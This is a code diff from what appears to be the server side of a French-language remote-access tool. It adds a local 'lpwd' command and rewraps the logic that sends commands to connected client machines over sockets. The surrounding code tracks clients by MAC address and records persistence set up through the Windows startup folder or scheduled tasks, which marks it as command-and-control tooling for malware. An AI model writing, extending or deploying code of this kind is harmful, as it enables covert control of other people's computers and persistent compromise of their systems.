@@ -387,41 +387,44 @@ class Server:
                                             shutil.copyfile(splited_cmd[1], "./ftp/" + splited_cmd[1])
                                         except:
                                             print("Erreur le fichier n'éxiste pas")
-                                try:
-                                    connection.sendall(str.encode(cmd))
-                                except socket.error as e:
-                                    print(str(e))
-                                    self.local = True
-                                    self.ordre = ""
-                                    self.current_sessions = 0
-                                    exit = True
-                                    break
-                                try:
-                                    output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
-                                except socket.error as e:
-                                    print(str(e))
-                                    self.local = True
-                                    self.ordre = ""
-                                    self.current_sessions = 0
-                                    exit = True
-                                    break
-                                try:
-                                    results, pwd = output.split(self.SEPARATOR)
-                                except:
-                                    results = "Les Données recu sont surrement trop grosse"
-                                if "Persistance via dossier startup activé" in results:
-                                    print("Persistance correctement activé")
-                                    DefinirPersistance(mac_address, "ON")
-                                if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
-                                    print("Persistance deja activer mise a jour du fichier client")
-                                    DefinirPersistance(mac_address, "ON")
-                                if "Persistance tache planifié activé" in results:
-                                    print("Persistance tache planifié activé")
-                                    DefinirPersistance(mac_address, "ON")
-                                    name_task = results.replace("Persistance tache planifié activé", "")
-                                    DefinirNameTask(mac_address, name_task)
-                                if not "Persistance tache planifié activé" in results:
-                                    print(results)
+                                if not cmd == "lpwd":
+                                    try:
+                                        connection.sendall(str.encode(cmd))
+                                    except socket.error as e:
+                                        print(str(e))
+                                        self.local = True
+                                        self.ordre = ""
+                                        self.current_sessions = 0
+                                        exit = True
+                                        break
+                                    try:
+                                        output = connection.recv(self.BUFFER_SIZE).decode('utf-8', "ignore")
+                                    except socket.error as e:
+                                        print(str(e))
+                                        self.local = True
+                                        self.ordre = ""
+                                        self.current_sessions = 0
+                                        exit = True
+                                        break
+                                    try:
+                                        results, pwd = output.split(self.SEPARATOR)
+                                    except:
+                                        results = "Les Données recu sont surrement trop grosse"
+                                    if "Persistance via dossier startup activé" in results:
+                                        print("Persistance correctement activé")
+                                        DefinirPersistance(mac_address, "ON")
+                                    if "Persistance via dossier startup déja activé" in results and ReturnInfo(mac_address, "persistance"):
+                                        print("Persistance deja activer mise a jour du fichier client")
+                                        DefinirPersistance(mac_address, "ON")
+                                    if "Persistance tache planifié activé" in results:
+                                        print("Persistance tache planifié activé")
+                                        DefinirPersistance(mac_address, "ON")
+                                        name_task = results.replace("Persistance tache planifié activé", "")
+                                        DefinirNameTask(mac_address, name_task)
+                                    if not "Persistance tache planifié activé" in results:
+                                        print(results)
+                                else:
+                                    print(os.getcwd())
                             #else:
                                 ##print("egale a rien")
             if exit:
